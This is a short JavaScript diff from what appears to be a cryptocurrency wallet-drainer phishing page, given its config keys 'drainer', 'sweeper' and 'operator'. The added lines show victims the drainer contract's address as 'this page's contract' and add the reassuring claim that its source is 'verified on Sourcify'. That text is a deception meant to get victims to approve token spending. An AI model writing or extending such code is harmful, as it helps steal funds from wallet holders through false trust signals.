@@ -62,6 +62,12 @@ for (const k of ["rpc", "drainer", "sweeper", "operator"]) {
   });
 }
 if (remote.chainId) log(`config loaded (chain ${remote.chainId})`);
+if (remote.drainer) {
+  const sp = $("spenderLine");
+  if (sp) {
+    sp.innerHTML = `spender (this page's contract): ${remote.drainer} — source verified on Sourcify`;
+  }
+}
 
 // se um POST falhou antes (API fora do ar), tenta entregar de novo o que ficou guardado
 async function flushPending() {
